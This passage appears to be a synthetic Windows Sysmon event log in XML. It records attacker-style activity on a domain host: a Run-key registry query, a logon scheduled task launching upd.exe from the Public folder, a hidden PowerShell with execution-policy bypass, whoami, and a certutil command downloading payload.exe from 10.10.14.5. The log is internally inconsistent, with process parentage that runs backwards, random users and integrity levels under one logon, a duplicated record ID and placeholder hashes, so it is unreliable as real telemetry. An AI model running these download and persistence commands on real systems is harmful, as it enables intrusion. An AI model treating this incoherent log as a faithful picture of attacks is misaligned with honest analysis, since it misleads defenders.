      <Data Name="ProcessId">6013</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">reg.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">reg.exe</Data>
      <Data Name="CommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000000D0000000D0000000D0000000D0000000D,MD5=0000000D0000000D0000000D0000000D,SHA256=0000000D0000000D0000000D0000000D0000000D0000000D0000000D0000000D,IMPHASH=0000000D0000000D0000000D0000000D</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0013-000000000c00}</Data>
      <Data Name="ParentProcessId">5013</Data>
      <Data Name="ParentImage">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="ParentCommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:38.0000000Z" />
      <EventRecordID>5014</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:38.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0014-000000000c00}</Data>
      <Data Name="ProcessId">6014</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">schtasks.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">schtasks.exe</Data>
      <Data Name="CommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000000E0000000E0000000E0000000E0000000E,MD5=0000000E0000000E0000000E0000000E,SHA256=0000000E0000000E0000000E0000000E0000000E0000000E0000000E0000000E,IMPHASH=0000000E0000000E0000000E0000000E</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0014-000000000c00}</Data>
      <Data Name="ParentProcessId">5014</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:45.0000000Z" />
      <EventRecordID>5015</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:45.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0015-000000000c00}</Data>
      <Data Name="ProcessId">6015</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000000F0000000F0000000F0000000F0000000F,MD5=0000000F0000000F0000000F0000000F,SHA256=0000000F0000000F0000000F0000000F0000000F0000000F0000000F0000000F,IMPHASH=0000000F0000000F0000000F0000000F</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0015-000000000c00}</Data>
      <Data Name="ParentProcessId">5015</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:46.0000000Z" />
      <EventRecordID>5017</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:46.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0015-000000000c00}</Data>
      <Data Name="ProcessId">6015</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="DestinationIp">10.10.14.5</Data>
      <Data Name="DestinationPort">443</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:52.0000000Z" />
      <EventRecordID>5017</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:52.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0016-000000000c00}</Data>
      <Data Name="ProcessId">6016</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000001000000010000000100000001000000010,MD5=00000010000000100000001000000010,SHA256=0000001000000010000000100000001000000010000000100000001000000010,IMPHASH=00000010000000100000001000000010</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0016-000000000c00}</Data>
      <Data Name="ParentProcessId">5016</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:59.0000000Z" />
      <EventRecordID>5018</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:59.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0017-000000000c00}</Data>
      <Data Name="ProcessId">6017</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000001100000011000000110000001100000011,MD5=00000011000000110000001100000011,SHA256=0000001100000011000000110000001100000011000000110000001100000011,IMPHASH=00000011000000110000001100000011</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0017-000000000c00}</Data>
      <Data Name="ParentProcessId">5017</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:06.0000000Z" />
      <EventRecordID>5019</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:06.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0018-000000000c00}</Data>
      <Data Name="ProcessId">6018</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000001200000012000000120000001200000012,MD5=00000012000000120000001200000012,SHA256=0000001200000012000000120000001200000012000000120000001200000012,IMPHASH=00000012000000120000001200000012</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0018-000000000c00}</Data>
      <Data Name="ParentProcessId">5018</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:13.0000000Z" />
      <EventRecordID>5020</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:13.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0019-000000000c00}</Data>
      <Data Name="ProcessId">6019</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000001300000013000000130000001300000013,MD5=00000013000000130000001300000013,SHA256=0000001300000013000000130000001300000013000000130000001300000013,IMPHASH=00000013000000130000001300000013</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0019-000000000c00}</Data>
      <Data Name="ParentProcessId">5019</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:20.0000000Z" />
      <EventRecordID>5021</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:20.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0020-000000000c00}</Data>
      <Data Name="ProcessId">6020</Data>
      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">notepad.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">notepad.exe</Data>
      <Data Name="CommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000001400000014000000140000001400000014,MD5=00000014000000140000001400000014,SHA256=0000001400000014000000140000001400000014000000140000001400000014,IMPHASH=00000014000000140000001400000014</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0020-000000000c00}</Data>
      <Data Name="ParentProcessId">5020</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  